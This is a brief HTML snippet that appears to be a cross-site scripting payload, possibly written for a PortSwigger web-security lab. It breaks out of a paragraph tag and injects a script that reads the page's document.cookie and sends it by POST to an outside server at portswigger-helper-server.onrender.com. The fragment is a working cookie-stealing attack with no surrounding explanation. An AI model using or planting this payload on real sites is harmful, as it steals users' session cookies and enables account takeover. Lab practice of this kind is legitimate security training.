```html
</p>
<script>
fetch('https://portswigger-helper-server.onrender.com/api', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ cookies: JSON.stringify(document.cookie) }),
});
</script>
```